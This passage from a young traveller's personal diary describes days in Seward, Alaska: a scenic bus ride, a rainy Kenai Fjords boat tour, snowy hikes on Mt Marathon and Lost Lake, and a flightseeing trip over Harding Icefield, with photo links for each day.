they\noffered a bus service from Anchorage to Seward with the same schedue, so\nI got on the bus and I am stuck on the road now.\n\nThe drive was so beautiful, almost otherworldly. It made driving along\nthe highway very tempeting for me, and I will try it some time in the\nfuture. But back to the bus drive. We first got out of Anchorage, from\ndowntown to midtown, and along Seward Highway. On the road I recognized\nsome places I hiked the day before. So much faster with car!\n\nThe driver is very interesting man and acted as a commentary along the\nway. We have 2 stops along to take photos and stretch, and they are\namazing stops.\n\nWe went around Gulf of Alaska and the driver explained that it was\ncalled turnagain because that the tide rise and fall so quickly, and\nthat at 6 am in the morning it is highest, but by the time we got to\nSeward the Gulf would be almost empty. Captain Cook discovered this\nplace. Also, they couldn\\'t construct a bridge across the Gulf because\nthere are only mud in the mountains, no rocks.\n\nThe driver said that we might spot Dull Sheep or Bears on the road left\nof Seward Highway, and \\\"call \\[animal\\] left/right if you saw\\\", then\nsomeone called dull sheep left. But I didn\\'t see anything, and we just\npassed. The driver also said that there might be seagulls, swans, or\nsomething. Then we saw a trail of snow or ice which covered the tracks\nof the train and the driver suggested this is the avalanche that cuased\nthe train to cancel.\n\nThe driver explained that there are no ecosystems in Turnagain, animals\ncome and go, and that sunlight cannot penetrate the water. Then we\npassed to Girdwood and on my right there was many dead trees, to which\nthe driver explained was once Girdwood, but in a 9.6 earthquake in 1960s\nit caused a large tsunami, which flooded nearly all of the sea cities,\nincluding hope and sunrise. The dead trees are salty and rocky, not like\nrotten dead trees, since they drank the salt water in the tsuname.\n\nThen we stopped at Girdwood as some passengers may be getting on the\nbus, I run around and took some pictures. There was mountains all\naround, and covered with snow.\n\nThen we kept moving and got higher and higher, to a parking lot where I\ncould walk on the snow. The snow was very soft and when you stop on it\nyou leave a big footprint. I nearly got my shoes wet. I didn\\'t walk far\nbecuase the stop was only 15 minutes. I could see the snow and ice\nstretching all the way to the top of the mountain. The scenery was\nbreathtaking and I took many selfies and let someone else took a photo\nof me. On the mountain among the rocks I can see remains of avalanche We\ngot to Moose Pass, where it was a small town with few hundred people,\nand that there are not a gas station. I spotted an elementary school and\nI wonder how it feels like to study there, since there are less than\n1000 people there might not be enough students for even 1 class. Then we\npassed the Trial Lake. The lakes here comes from glaciers and is\ngreeish-blue. The lake is so calm and beautiful and I thought about the\nlake and mountain I saw in Switerland but couldn\\'t recall much since\nthat was many years ago. We went along Kenai Lake, and we are currently\nstopping with Kenai Lake under our feet. The Kenai Lake is shaped like S\nor Thunderbolt, and it is very very long. It is the best place for\nSalmon fishing, and they would go \\\"combat fishing\\\", shoulder to\nshoulder on the ground.\n\nThe mountains are covered by green pine trees and bushes up to a certain\nheight, then it begin to get white.\n\nThe driver said that there are only 3 seasons in Alaska, winter, almost\nwinter, and construction, and since it is expanding this highway there\nis only 1 way to go, and now we are on the way again. It is raining hard\nat this time.\n\nWe arrived at Seward pretty soon, and I went looking for Orange Bike\nluggage service. Turns out the door is locked but there are 2 young\npeople with the tag on the road, so I deposited my bag. It was like 11\nam, and it was raining so hard the town looked worn down, and there is\nalmost nothing I can do. Then I went to Kenai Fjords tour which I\npreviously booked in 517, and I asked if I could change the date and\nthey said they could, and I got on the boat at about 11:30 am.\n\nIt was raining pretty hard. Only as I got on the boat did I realize that\nI haven\\'t been on a real cruise before. I did remember going on a sea\nor lake a few times maybe, but the ship is so slow and so peaceful that\nI could barely feel anything. However, today it is absolutely different,\nas it was rainy and windy, and when I went on the deck the wind blew so\nhard that I couldn\\'t stand without hanging to the railing. Anyways, I\nwent back inside and found a seat at the front of the boat across 2\nelder woman, and they asked me to take a picture of them and I asked\nthem to take a picture of me in return.\n\nThe boat was almost like riding on a rollar coaster, as it goes up and\ndown. I couldn\\'t even stand at first. But eventually I got used to it.\nI saw some young people going outside at the front of the boat, so I\nwent out too. The wind blew water in my shoes, but it was fun standing\nright there nevertheless. We kept going and it felt more like a cruise\nout to the sea than a national park tour, as I had imagined. The captain\nhad a harsh and deep voice, and I couldn\\'t hear him well inside the\ncabin. The captain announced we are going 110 miles, and off we went.\n\nAfter a while I heard the captain call \\\"orca\\\", and the ship slowed\ndown. Many people went out to shoot photos. There is a black tail there,\nand the captain explained that it is the fastest swimmer, going as fast\nas 30 mph. Then the ship started again. The mountains are surrounded by\nfog, and I couldn\\'t see much. Everything around looked misty and\nmagical.\n\nThen we went to see glaciers, and it was the most stunning thing I had\never seen in my life. It looked so pure. There are floating icebergs on\nthe sea, and as the boat went around I could hear crack crack as the\nicebergs hit the boat. I saw like 7 people kayaking around, and it had\nalready been quite a time on the speedy boat, so I don\\'t know how these\npeople had managed to get all the way here, and how they had managed to\novercame the freezing temperatures. It was very cold outside, and my\nfingers went frozen. Almost everybody else had gloves. There are eldely\ncouples and young man, mothers bringing their young children. It was a\nlovely site as everybody was taking photos and selfies and looking\naround.\n\nThe glacier came between mountains, and it was sort of white-blue color.\nI wonder if there is some fantasy kingdom on there, as it looked like in\nthose disney movies. The glacier looked too magical, coming out of\nnowhere and shaping itself in beautiful curves. There are icebergs\nfloating all around, and they stretched in all directions, all the way\nto the mountains. Then one of the crew members picked up one iceberg\nwith a fishnet, and showed it to us to touch, claiming it had been there\nfor hundreds of years. I couldn\\'t describe it better in words, but\nafter seeing that I find the trip very worthy.\n\nThen we went to see a second glacier, and I heard noise of ice falling\nto the ground. Among the iceberg there is a whale, and it would\noccasionally come up to the water to breath the air. There is also a\nsmall hill with no trees, and there are some caves in it.\n\nI got very sleepy since I didn\\'t get much sleep last night so I dozed\noff. Then it was 4 pm when I woke up, and the rain stopped, the day\nbecame cloudy and rays of sunshine penetrated the cloud to the ocean.\n\nThen we went to see seals, and there are fat, slippery and cute just\nlike in documentaries, where polar bears would try to snatch up as their\nfood. There are many seals resting on a rock on the ground. But there\ndoesn\\'t seem to be polar bears here. The ocean became blue as we came\nback, and the mountains were clear. We then went to Fox Island to pick\nup people, and I wonder how it feels like to live on the island.\n\nThen I think it is time to call it a day and I went for my luggage and\ncame to the airbnb. I think I really love Seward and I am enjoying my\ndays.\n\n### Photos\n\n\\\nSunrise\\\n![](https://cdn.jimchen.me/yXInqKS-DNSRqHZw8QnaxejYm-rgeS6SIK-_0P0AVlyKDizKl9BrKuOhcT1aGE6NYsQ_DsMcBh2Uq3qPZgOf732oz-7YrQbaIFUpPVPtJVQeuSyWiFAYnY3j6VZKDHbvffS0kFu5d4bACujxPajcW_4=s800)\\\n\\\nTurnagain Arm\\\n![](https://cdn.jimchen.me/HltZzQ87ouSoxWHqlhfxMtqR44jGsG3JsX9Mh7ausnlowqanI2g6d7M_1sxveezI8g8j0p6dxlOQB1R37cOVt4LIONLt6Z3G_FsvzffAOLK4_riYZeCkKY2Dt7pNylP4fOeTQZOotdgi-u8fKSBlrvU=s800)\\\n\\\nGirdwood\\\n![](https://cdn.jimchen.me/dKGlxosdgCPf20CTmE_8-FxPpzgJ8T8d7xRM5Jb7rQjP0dVkuu8grSWWR-rNeb9xGOYzK-yptGntOqoJ9sOhyZmt7zHgnMzn0aDjXfm7vAMVaHZZpjmSE5IsGls3NGONqYce5qR25RJwoaVPaLJXrts=s800)\\\n\\\nChugach National Forest\\\n![](https://cdn.jimchen.me/GinQGeWBKGHXIQzyaBGS3FOaclbU-VENdDLLSx9UDuztL4jOPC7q6z1ZJn3qSxlspCEr0l98vAW8jD_xy4D37TFz6zmdtiOr4REqpFhBLULbOzF3mjcnNld7FgleuWZhTOmUZrFq7BHmeqRZMhQk9Ys=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/sdvHow7voBlZ-PQQ_pPwgGwU0NsspIGTdbYVGaWZ9KR0mKes48VdneL7UozZB-Zeb7Hze23dsVyDN7no5xJjowd18gHbP50l8zHuq8xndaTxFN_ZoA6JMMkEXcxCmabdrrN2dQytSsYES0o1FPzPLIU=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/97-tHgFFuZAImkYhG-AfUE2wOvx2Qudg3-uUZQaEa7Tt2Wvs60CgPe9WlJh_gb1r3SJNy7sq0DeHoLSPHlf0e3Jy0w98m3meurRdNdbz6wtJNotFmI4J71iR9UQRV-0hiDrQTYNsBJgcjcuw509JUjc=s800)\\\n\\\nJerome Lake\\\n![](https://cdn.jimchen.me/gRgsodj9ANJSXTwnnTJaFrnYnoPL7gPYRgLxxlVUr6d23h9Oj0iega1zSIU9rg6JqfspZVt_3Qh_ptTtCv3eG1J0G3lkmPlBB9uhehvDl6Odc97_DqtWjBIda4qV7M6V59au26QG_RMgYWyceGQrYjw=s800)\\\n\\\nTrail Lake\\\n![](https://cdn.jimchen.me/lgJirvDwS9YnewytJFQYr9uhc0ehzbsp0gn-dq7ZB5mOhnvq_A5M1MpnjTVl89wFZIblIQjAOU0EZr9DICCiqUakaTFrbaRfCdlfMtvo2zdqOe-xh-6sYxxZM8eK6oOblZiQLRmUliuXJj_XuVtMh28=s800)\\\n\\\nKenai Lake\\\n![](https://cdn.jimchen.me/cuKt1FGQuT9iOF9OBHJ2KKeU2g6NBjbOky8_oNvM3eb0jIkzE2N16dGemQeymjR9DDYrJhaRstUG5m_UETQq80r75ZOr9lUtMoPF2y1s6xR6QHoE1SpT60fgnzxkaJTDF6NRROViysPOj7ySnWkhK9I=s800)\\\n\\\nKenai Fjords Boat Cruise\\\n![](https://cdn.jimchen.me/psnjgdPs2m9Tdkkypz3VwPaUdy-7_--qBNo1llGzVbTqmhVW90TqH70eGgWCiqMu233sIXiolKjXO1WiLq6D6IPMSGhYYTSvaARTsDX0ixgNPaHtyM21ejf-Dac_vyFvOuXI7j-IjAULi6WlyuuI1lY=s800)\\\n\\\n\\\nHolgate Arm\\\n![](https://cdn.jimchen.me/lFftsL36oyLqECXuvB42lTnOVALk6WfNBJzLjtXhSBzxatx1wL257tpj0RynCEhzbTa5UYDeNmuquFKj_5LzE1AdILxbCkb9OGH0JO7Ps_dvdRwJ6BN9qzU9uOmV9KlrgUC9s94tvmadE8R5sxy5k0Q=s800)\\\n\\\nHolgate Glacier\\\n![](https://cdn.jimchen.me/wkOezc5UAJQoE08XNJgbVdeHYlTCma7-0Mn4yeSZ1H0rheGSA-TwSAgzUPc1hRx0f-nheNK8JgNVbe2jSyTKBPXZkBGfcRPC8jMKuN4343CfEPmY0AGjtHhm0u8Z_ZfvPbYsLjE5vEIfga78pgjb6rg=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/asdkRWC0KiDG4qOCA4fgxwcMXhYaQOE7qgdE6admodeGUJAcoNC7YwM02s1QDeX9e0KjK_kSRLicNftHSL1acKaPaV2H2XkyD9pi5DL8onTWE_pvuEmbVs15xxzRzxyL0-3JAQahue7bNGOX1_KWe30=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/By288CkP9DzLQErT8_qTSj8EMopdVVzCY9Dznv-UolWtYHfgOpC1OdYeHXcyIFvYlIC42UeZsh0RebEDFqV78G1dJyFNfHFTUGAD0N9ATLv4NbD4RL36A5GTVfj0eBguMs6byLPcVQUUhaxCVSj-spk=s800)\\\n\\\nAialik Glacier\\\n![](https://cdn.jimchen.me/T_RT1lyoAgDO0XfEEm7suqCyyyrsPW898kj41zUHEYe9q9oJOmsjK7QJZTf43_N0uvzfrm7f8p7HDS7Zw8FhSDk5l3CnPyaiQNPzQeJVWOakcC4RRApJa5P5gksz5ff0jWvlxzdrJIQkWqIMx-kJHyU=s800)\\\n\\\nDerby Cove\\\n![](https://cdn.jimchen.me/c6B5hr4yuMKCBaPlGlvVuRwFmV1RbfEspGs0tw2JfeSGRrYTFdereYtFdrxxDJfAJQYTpfjgq-cgKiuRsJznlRU6uUvNuMFew0NLz4Hn5C2L6k16b1VNkrm3d4gmc6zpR0k8EG9DcS4rbjNW0TwFUSY=s800)\\\n\\\nAirbnb 3rd Street\\\n![](https://cdn.jimchen.me/qtUFmIsWU0b4X786dNtJaEVTyyWqmBmyYvvc8qSm2qb2J4NMA2ESFUVdys7utFC99O9QCVOShJWpL-eJzVWvcwIs0W6calTDY5fPLPyfsBU0ByoWIWSejw_kLLlXmKyx3WDYxK0GGBOFTN6ItozfNaY=s800)\\\n\n## 517\n\nToday is 517, and I slept half of the morning. The airbnb wasn\\'t as\ngood as the last one, and in the morning the cars were very noisy.\n\nThen I wanted to go to the Seward visitor center. I first went out to\nthe two lake park, and there was a woman with a huge white dog. The dog\ncame after me, and the woman shouted \\\"friendly, he is friendly\\\". I\nmanaged to get away and went on the opposite direction to see the\nwaterfalls. Only at the park did I realize that I had been walking on\nwell-constructed roads nearly all my life, and hadn\\'t seen a trail\nbefore. The trails are just basically a place where there are not a lot\nof plants going, that you can get through. I went to the waterfall, then\nwent back, and there was the woman and the dog again. This time it\nwalked up to me, and I was so scared, but it merely stopped in front of\nme and looked kind of cute and the woman smiled and said \\\"sorry\\\", to\nwhich I replied I am afraid of dogs. Then I walked to the 2 lakes and it\ntook me a long time to get out, and I was kind of sore.\n\nI was wanting to get a breakfast or lunch, and went to Ray\\'s\nWaterfront. The servants are really nice but the price was so expensive.\nI ordered a hamburger and a dessert and it took me 40 dollars. I thought\nthat I would never eat at such a restaurant again, and that I would\nalways go eat and subway or something like that. Although it said only\nhamburger on the menu, the dish turns out to be hamburger and fries, and\nthere is a steak and some bacon and some mushroom in the hamburger. I\ndidn\\'t even finish the hamburger, out of my expectation, since it is\nvery large. I then asked the people in the restaurant if it is plausible\nto hike up Mt Marathon, to which they replied that it is best to go with\na mate, and there is snow on top. I wanted to go to Seward visitor\ncenter but it was 1 mile away, and I didn\\'t want to walk anymore, so I\ncalled them instead and asked about the trip. I took the whole dessert\nback. However, I spilled part of the dessert in my backpack, causing my\nbackpack to be flooded with milk and cream, which covered my pen case\nand water bottles, and I had to take time to clean it up.\n\nThen I went to Mt Marathon. There is a 5k race every 4th of July at\nSeward that is kind of a real popular event, and many people came to\nrace on Mt Marathon. But it was only mid May now. The trailhead is 100m\nfrom my airbnb, and when I walked up to it I saw a sign that said not\nfor inexperienced or unprepared, but the trail looks good enough, and it\nsaid \\\"jeep trail\\\", which I am guessing is for jeeps, so I climbed\nanyways.\n\nIt is steep and I took many rests along the way, but overall not that\nhard. I was afraid of bears but fortunately I saw no animals, well\nexcept for maybe birds and squirrels. After the Jeep trail the mountain\nis covered with snow, and there was nothing I could to do to keep going,\nand that is about 1/3 of the whole trail. I was stil fresh, and walked\nalong a waterfall for a while and took some pictures before turning\nback. In total I met 3 people on the trail today, with one experienced\nmid-aged man going up and down very fast, saying he is going up 2 times,\nand an elderly couple, who didn\\'t went up the trail much and said they\nwere only there for 2 hours.\n\nThen I went to Lost Lake trail. I wanted to go somewhere and went to\nHarbor 360 and asked how to go there, and they said there is shuttle but\nsomehow I didn\\'t find any information of the shuttle on the Internet\nand they said it is best to go in a taxi. So I went there in a taxi, and\nit took me 25 dollars, and 50 dollars round trip, which I found very\nexpensive.\n\nSo I went to the start of the trail and wanted to began hiking. However,\nthere is a water spring blocking my way, and I suddenly began to feel a\nlittle sleepy. I wanted to find a way to cross the spring but couldn\\'t,\nand the road around was covered with snow. In the end I finally stepped\nright into the icy water and crossed it. Then I went hiking and the\ntrail was very rough, partly covered by snow. Halfway up I saw a man and\nI said hi and asked how far could I go. He said he went on for 2 miles\nbefore turning back. The path is so hard I am always in danger of\nslipping, and there are 2 trails, summer trail and winter trail. I\nthought that since it is closer to summer now I would take the summer\ntrail. The trail is mainly small rocks and tree roots, and there is snow\neverywhere and snow is melting, causing the mud to be very wet. There\nare bushes, but those shortcuts are hard. It is really hard course.\n\nHowever, the summer trail is just covered with snow and full of ups and\ndowns, and before long I had to turn back since there is a cliff and\nwith so much snow it is very dangerous, and I had already climbed a\nmountain a little today and wasn\\'t that fresh, so I turned back. Then I\ntried going to the winter trail. I saw two woman, and they were also\ngoing into winter trail. Somehow the winter trail is much easier than\nthe summer trail, and although they are both covered with snow winter\ntrail seems it is designed to be like that, and the road went on quite\nsmoothly. However, I was very tired in my legs and my water is running\nout, so after about only 1 km I turned back. Literally the snow was so\nhigh that I tripped and half of my body went into the snow. I didn\\'t\neven go to the point where I could see views because there are too many\ntrees. The two woman looked prepared and kept going. During the way down\nI bumped my foot a little, and had to step into the icy water spring\nagain. I called the taxi and it picked me up. Then I searched the map\nand it was like 14 miles, which is like 22 kilmeters all the way, and I\nam not that well prepared anyways. I looked at photos online where there\nare trees and flowers and the trail seemed so beautiful in the summer\nwith no snow, and I was like, how bad is it that I came in such\nconditions. It is only mid-May, and I figured that it will take about 2\nmonths for all the snow to melt. Anyways, the day is long and hard, and\nI didn\\'t actually see much, but it is still very unique first-time\nexperience for me.\n\n### Photos \n\n\\\nRay\\'s Waterfront\\\n![](https://cdn.jimchen.me/pzOCQzUS_lxgMFNXm2q1sHELHDUVu61EAMndwRcx57RLwkW1Hg5ckG0je-JSJ_tDnP2W3I1eQVOxOWLlWaROO0-drUIPWpXLUVjBmueDFmLqcsBhk9Lfhr1EgLiaLpXDa1T6x4sli3YR_nqa0Maezwg=s800)\\\n\\\nMt Marathon\\\n![](https://cdn.jimchen.me/A_jVFoYzd7auni0xsMC4AclRRbjwti2MzLkE1QZsgsrqZ-GVu5YRjdDUEx-124gzHhTqb0gLAGGXD7n16JlrCtzuXgj36V1qogAULys32adjHLpiyC2QrJsX_7RJ2u6k9ppaFIri-8idS3HFcgbz2do=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/KsiwDNr2OtCJ6glx_5rv-9mnNqk_W5dTJQLU3JQhWHcZNvbkOh1ptQB1joTfPAFX4slmWptBHsSFuF_70AhfhbzKu1P7h7hZcoevTKFaB58qrWXnUxO1GQS9KjWuGWteOLeCqRj2l6PloyRhlgqb0H8=s800)\\\n\\\nLost Lake Trail\\\n![](https://cdn.jimchen.me/QYWHgojcHLatHMkpkzDM9c4gwLqD18ihTkn2uyIvvuW1EM9w4ItK1G0JxmJ6wE2-JstGqSk_TNPyj1pL7-hbXYRO_3y9w4QOgL4ZC2ceA2WhgIFOAIHo3aZgMhW_K3wb28JWZx4TtWrdBSpmgDXmBJo=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/gTR_uvlptQ3DIZungebcQRt2CIpXfDxhJjtUK3fExtxWzjTPc_YcNmc-MkvvtQa4yHK-h-XDy2TSIwWvvVyHoRZ8g2cZ2uhOHYxiRY2uGntW6O1fsIV_3PpCBnTSA4FoJ0zQySixgTnV5mWMd00Svro=s800)\\\n\n\n\n\n## 518\n\nToday is 518, and it is halfway thorugh my trip. I am boarding the bus\nto Anchorage now, and hopefully I will be in Denali tomorrow noon.\n\nToday I went flightseeing. It was originally scheduled at 10 am, and I\nwoke up at 8 am to walk there. It is very hard getting up at 8, and it\nwas a long walk. I walked passed Seward High School and the Ryan Lewis\nMemorial Field, and there are some people playing soccer and frisbee.\nThey are very young, and I figured that they are probably the students,\nand I really wanted to join or have a conversation but I am quite\nsleepy, and need to go to AA Seward Air.\n\nWhen I finally went there, which is a kind of hard walk, and my legs\nwere sore. The winds were blowing so strong this morning I felt in\nblowing right in my face, and I went in the little house and chatted\nwith Malia, a worker in the AA Seward Airline. There are many brochures\nin the little house, and I thought about Kayaking adventure and\ndifferent hiking routes I didn\\'t even try, and thought there are still\nso many things I can do. She asked where I came from and what I was\nstudying and had I been on a small flight before, and how there was this\nsnowstorm 3 weeks ago that made mountains still covered with snow, and\nthat in normal years snow would have melted. I learned that the pilot is\ncalled Joey Smith, but he is also kind of mechanics and organizer and\ncommenter. It kind of made me want to be a pilot someday. However, after\na while, she told me they couldn\\'t fly the plane this morning, and I\nhad to join the afternoon tour at 1 pm. I thought how I could have slept\nall morning instead of waking up at 8 am,, but the tour at 1 pm is more\ncostly, so it turns out to be a budget, but still, it is very expensive\nto fly anyways. They offered me a ride, and I said I wanted to go to\nSealife Center, so they took me there in their car.\n\nHowever, sealife center is very small. There are only 2 floors and I saw\nSeastars and Seals and Sea Lions and Shrimps and Anemone and Skate and\nSalmons, and some kind of birds with a strange voice. The birds were\ntrapped in a net so they can\\'t fly out. I ended up getting out in less\nthan 1 hour,, and there was still some time left before 1 pm. The wind\nwas very strong outside.\n\nThen I went to the Waterfront Park, the view is fantastic, the snowy\nmountains rising on the otherside. There are some kids halfway on a tree\nand they smiled and said hi to me. Then there is a pavilion where\nsomeone is having a barbecue and it smells so good. But it is kind of\nprivate. Then I saw a playground where there are kids of all ages, some\nalmost my age I think. They are playing happily on the swing. Then I\nkept going, and it became so windy that I had to get my hat on, and\ncould barely walk. I went to Firebranch BBQ to have lunch, which is kind\nof delicious.\n\nThen I walked to AA Seward again, which is like 2 miles walk, so I ended\nup walking 4 miles in total, which made me sore. I walked on the rail\ntrack, and got there in time, at 12:30. Then I saw Malia again, and it\nturns out that I would be flying with an Australian couple. The elderly\ncouple was really nice, and introduced themselves and the big man shook\nmy hands and said Hi Jim, and told me he was Rob.\n\nThen we flew on the plane. It was my first time on a flight, and I was\nso excited. I had those life jackets on and they also suggested me\nweating earcovers with microphone as a way to communicate, since it was\nvery loud, by normal voice people cannot hear each other. There are 3\nseats beside the pilot\\'s seat on the airplane, and it is sort of formed\nlike a car.\n\nThen the plane took off, and in a matter of seconds the town of Seward\nwent small, and the pilot Joey Smith said we are going to see glacier,\nand off we went. Everything just seemed so spectacular on the airplane.\nI had seen some glacier on the boat, but on the plane it looked totally\ndifferent, and we went straight over, and I could see all those oddly\nshaped icebergs on the ground. Occasionally there is a blue pond, and it\nreflected in the sunlight. The glacier is just dazzling, and I was\ntaking pictures the whole time. The man chatted with the pilot about how\nto tell winds, and it seems the man had some experience with flying a\nplane.\n\nOn the way there was a bear on a beach, but it was on the other side of\nthe window. I also managed to take a picture of the bear, and it is the\nfirst bear I saw on the trip. I figured I would probably be seeing some\nin Denali. I kind of wondered why sometimes the lake shows a reflection\nof the mountain and sometimes it doesn\\'t. I then thought that this is\nas good as those scenery films on YouTube featuring like Switzerland or\nIceland, with floating icebergs from the glacier, and all those\nbeautiful shapes carved by snow. Most of fresh water comes from\nglaciers.\n\nThen we went to Harding Icefield, and the pilot said there are some\nglacier climbers he had just dropped off here a few days ago, and they\nare camping down. We managed to get a pretty close look on them, and\nseems to me glcier climbing seem so interesting. We were going past the\nHarding Icefield, and it looked like a white desert, so pure and so\nwhite that I could barely open my eyes. I was amazed by this massive\nwhite down there. It purified my heart, and I looked at the harding\nicefield and it gave me a sense of calmness when I thought about\neverything else. In the ground snow covered everything else and white is\nthe only color, and I thought that maybe after a few hundred years after\nmy death my life would be kind of like that, with white covering\neverything and leaving not a trace in the world. I am yet to go to a\ndesert, though. The pilot said that if we land down there the snow can\nget all the way to waist. I kind of wanted to go to Harding Icefield\nTrail but it was closed. Then we circled back.\n\nThen the flightseeing tour ended and it was really fantastic. Then I\nthought that a bird could easily do that flight everyday. However, a\nbird can\\'t talk or be as smart as humans so anyways, and we were saying\ngoodbye when the couple noticed I was walking, so they offered me a\nride. I was touched and so grateful fromt he kindness of strangers, as I\nbarely talked with anyone all year long, and barely know anyone would\nhave such kindness in their hearts. So I got in their car, which is big\nand contain a table and 2 beds. They are very kind and let me sit in the\nfront. I kind of want to rent a car too. I thought about coming here\nagain in summer of 2025 when I would be 20 years old, and I would learn\nto drive and rent a car like theirs and drive up to Prudhoe Bay alone,\nand how I would see the Arctic Ocean and the northern lights, and hike\nto the most beautiful places in the world.\n\nThe man told me they had 60 kangeroos in their backyard, and when\nthinking of backyards I was like thinking about the 30 square feet yard\nthat people in the first floor would have, and it felt too amazing to\nbelive. Then they told me their backyard was 9 acres, and I found that\nit was something as large as 10 football fields, and I couldn\\'t help\nbut get amazed even more. Then they said it wasn\\'t even big in\nAustralia, which made me wonder just how different are people\\'s life\naround the world, and I have no knowledge at all about the world\nwhatsoever if I stay in Shanghai my whole life. They dropped me off at\nHarbor 360, and the woman gave me a doll with Australia on it, and I was\nso grateful for the gift. I thought about going to Australia one day,\nand it turns out that I forgot all of my times in New Zealand.\n\nThen I saw a free shuttle and I hopped on it, and the driver was like\nwhere are you going, and I was like I don\\'t know just wanna go around\ntown. There are about 20 other people on that bus, so I went around and\ngot off at Sealife Center again, because I didn\\'t know where else to go\nto. Then it was like 14:23, and I figured that since the bus departs at\nlike 6 pm I stil had lots of time to do whatever I wanted, and I thought\nabout going around and turning back at 4 pm. I first went to the Lowell\nPoint Waterfall, which is quite small. I was at kind of south end of\nSeward and didn\\'t know where to go, since Caines Head was like 2 miles\naway and there are no trails besides Mt Marathon that is less than 2\nmiles away, so I settled with Mt Marathon, and I decided I am climbing\nit again. Since I was climbing the hiking trail yesterday, I figured I\nwould be climbing the racing trail, and I went to the trailhead\nyesterday and a man explained to me where the racing trail was\\--at\nJefferson Road. So I walked to Jefferson Road and went in and tried to\nclimb it.\n\nHowever, the path is so treacherous. I never saw such a primitive and\ndangerous path ever before. I first saw the cliffs, but there are\nsliding rocks just everywhere, it is just too dangerous and not even a\nway to go. Then I saw another trail and went up a little and found the\nwaterfall switchback trail, and I figured that it is the \\\"easier\\\"\ntrail and I would like to attempt it somehow. The path went up a\nwaterfall, and it was so steep like 40 degress up. There are leaves and\nmud and falling rocks everywhere on the way, and it was just impossible\nfor me to climb with a backpack and my jacket in my hands, so I put the\njacket in my bags. I climbed like 30 meters and couldn\\'t go on anymore,\nand it felt truly like rock climbing. There are many rocks that is not\nstable, and there is no place I could get a firm hold on or put my feet\non. At one point I was almost sliding down the mountain, and kept myself\nnot sliding with my arms almost underneath me. And there is nothing I\ncould do except turning back from the racing trail before going through\nthe first like 50 meters.\n\nAnd then I began to climb down, and I realized how hard the trail was\nagain. Turned out that I crawled on all fours with my butt on the ground\nand my backpack in my hand, and I got my pants all covered in dirt. But\ngoing down is much safer. Then I saw 2 people, probably a couple, coming\ndown and they were going so fast on the impossible trail for me and they\nlooked as quick as a rabbit, and as easy as walking on the ground.\n\nI thought that since I had grew up in Shanghai, a crowded city where\nthere are no wildlifes and no mountains and doens\\'t seem to be exposed\nto any kind of nature except those artificial small trees and tinny\nponds in the school or something like that, I have no experiences with\nthe mountains or rocks. I imagined myself going up the treacherous trail\neveryday instead of playing in Century Park, and camping outside and\nhiking alone instead of spending most of my time in cram classes, and I\nthought that would be so fun, and this path shouldn\\'t even be hard for\nme. However, I could not go back to my childhood, nor could my parents\nafford it anyways, and I thought that maybe if I come here after\nobtaining maybe a higher degree and be a professor or something, then I\nwould have the chances of exploring nature pretty much all the rest of\nmy life.\n\nAnyways, I said hi and since I was lying on all fours they jumped to the\nother side of the waterfall and went down really quickly, and before I\ntook one or two steps they were at the ground. I finally went down the\ntreacherous path, and they were just driving away in their cars, and we\nsaid hi again. I said I am visiting and they said good job, and the 3\nmile up the mountain are the hardest in the world, the waterfall part\nare very hard and it will be easier up there and they congratulated me.\nSo I was happy again. I kind of wanted to go up there but anyways I was\nlucky to go without injuring myself. I went to the railroad depot and\nboarded the bus.\n\nThen it became time to say goodbye, and it became very very sad\\--I\nnever want to leave Seward, and this is almost my favourite place so\nfar. Alaska is so much better than Berkeley, where you cannot even eat\npeacefully at a Macdonald or Subway, where there are too many homeless\nand beggars and strange people that walking on the streets downtown\nyields a feeling of disgust, although the surrounding area is ok. But I\nfigured I have been to most of the surrounding areas already anyways.\n\n### Photos\n\n\\\nSeward High School\\\n![](https://cdn.jimchen.me/h7tSAsREqNYRGb8AviTLGpTbUvSZrL6k48TiRH4Nrhtpe55zV4dFyrXwcQ9AZo4SQhKmX4-7ySU_wpE22JqKseytFrDrWP9Eb2Wj9izqGP4HhLYmi1Umli82QdywgwFTrQQd28YmraVbzoJRm3iW2TJSiQ3sIDU8w5_xPRxB6Eu-wfoUgZSPmCRoaML4og=s800)\\\n\\\nResurrection Bay\\\n![](https://cdn.jimchen.me/QQBF-eEDOQjSbGH1zJSpBn3k05qrquZwnBxj-mgxLbIn9SZ7wrbTUcjpgMnrHAh20btqwJwgCUx7hjs444KkjxzT19ozRtOW5_cC5Idd5nmpE2ZU3PAUlB_4-DTzWUrLpBtuS7GCPPOf1e_2BdYbEQQRkQSOGZz3-awIl1RLahekVijkmG2VPHv0PuLyfQ=s800)\\\n\\\nHelicopter Tour\\\n![](https://cdn.jimchen.me/Chp_rt-o13Poz5NYWiaj0caYi2x2NMfexdt_EkKrn_gs6BJtolXlJtkll20SL1aGV4PrVTeDHCkc72y29HTlQChmdeADR8pN5pluQlioyGzRK3qDATLt5cJj9hGViAno3p3RDDuPm2oh6qw96GmHkMduVUNizfbjTbQBgOWpSTnz2ZiArp-DMHMm02u0hg=s800)\\\n\\\nBear Glacier\\\n![](https://cdn.jimchen.me/1Lmv8TcGxgHVrzJOWEYANojKuleZGSHZ1wN6UXrbnr_lCpIpPkQq0xTg68qhMgbJSvqVoJgpL7ZOz0lIhB_s0kYqtK6hCsA2xf6hetRXgxfXw08NfEyw6B73gCahYHzFjxv_mU1l0AHcaYFQbUd6Zf6jHEcDh09peVkDTqirsv75_zXpVcBxDatOTBbRlw=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/V8ibHfD5QLfX_UMiebIws8fHU6Te_rQCbpl40bog2bgk86i7Kndyay3UWR2FqKSUh4hNnEI_dEqNytlmDQx2G3H65scDK-IVctnnE3DRbCjvfd99i4J-FtYe06W33UZCsCYIKwpbDgIGaMsAUP82dEYHfyiHeT2gD-F-IiPg6aZBWI04hoZIcVMKCSseRA=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/n-UK0GDgiIxDRHnlBeXbvbsb9NwJ8ZCt6-UHUoOzrIran2NPk_NF4nBAuEFqE6Je02aGKkhAcvA5wcagIUQrtG926vF-pNefnmK3KjznHpwL6KX1tbGBzs-FRBG6Muz6LZDZppga_z4W-GTfOUDj9eQB0tPokKkZm8ORkBlalvxl2n7sXoFZUWjjJv0sxw=s800)\\\n\\\nSlate 